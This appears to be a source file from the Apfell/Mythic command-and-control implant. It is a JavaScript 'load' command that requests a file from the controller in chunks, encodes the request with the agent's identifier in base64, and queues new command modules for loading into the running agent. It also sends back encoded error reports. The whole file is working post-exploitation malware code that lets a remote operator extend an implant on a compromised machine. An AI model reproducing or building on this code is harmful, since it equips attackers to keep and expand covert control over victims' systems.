exports.load = function(task) {
    // TODO: load
    try {
        let args = JSON.parse(task.parameters);
        let response = {'action':'upload','full_path':'', 'chunk_size':1024000, 'chunk_num':1,'file_id':args.file_id};
        let encodedResponse = JSON.stringify(response);
        let final = apfell.apfellid + encodedResponse;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
        loads.push({'type':'load','name': args.cmds,'file_id':args.file_id, 'task_id':task.id,'data':[]});
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }

};
COMMAND_ENDS_HERE